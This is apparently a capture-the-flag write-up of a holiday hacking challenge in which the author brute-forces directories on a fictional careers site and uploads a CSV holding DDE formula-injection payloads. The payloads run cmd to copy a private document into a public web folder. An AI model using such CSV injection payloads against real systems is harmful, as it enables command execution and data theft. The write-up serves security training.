# 7. HR Incident Response
> Santa uses an Elf Resources website to look for talented information security professionals. Gain access to the website and fetch the document C:\candidate_evaluation.docx. Which terrorist organization is secretly supported by the job applicant whose name begins with "K." For hints on achieving this objective, please visit Sparkle Redberry and help her with the Dev Ops Fail Cranberry Pi terminal challenge.

1. Ran DirBuster to find the existence of `/public/`:

```bash
docker run --rm hypnza/dirbuster -u  https://careers.kringlecastle.com/
Jan 04, 2019 11:54:45 PM java.util.prefs.FileSystemPreferences$1 run
INFO: Created user preferences directory.
Starting OWASP DirBuster 0.12 in headless mode
Starting dir/file list based brute forcing
Dir found: / - 200
Jan 04, 2019 11:54:47 PM au.id.jericho.lib.html.LoggerProviderJava$JavaLogger info
INFO: StartTag at (r172,c2,p5860) missing required end tag
Jan 04, 2019 11:54:47 PM au.id.jericho.lib.html.LoggerProviderJava$JavaLogger info
INFO: StartTag at (r227,c3,p7829) missing required end tag
File found: /static/js/postrequest.js - 200
Dir found: /public/ - 200
Dir found: /css/ - 200
Dir found: /Public/ - 200
^C
Caught exit of DirBuster
Writing report
Report saved to /DirBuster-0.12/DirBuster-Report-careers.kringlecastle.com-443.txt
Enjoy the rest of your day
```

2. Went to https://careers.kringlecastle.com/public/ and read:

```
Publicly accessible file served from: 
C:\careerportal\resources\public\ not found......

Try: 
https://careers.kringlecastle.com/public/'file name you are looking for'
```

3. Wrote a CSV file with a payload to copy `C:\candidate_evaluation.docx` to `C:\careerportal\resources\public\a.a` in such a way that I can download it:

```
Name, LastName
"Mister", "=DDE(""cmd""; "" /C copy C:\candidate_evaluation.docx C:\careerportal\resources\public\a.a""; ""asdfasdfasdf"")!A0"

Name, LastName
"Mister", "=cmd|' /C copy C:\candidate_evaluation.docx C:\careerportal\resources\public\a.a) '!A0"


```
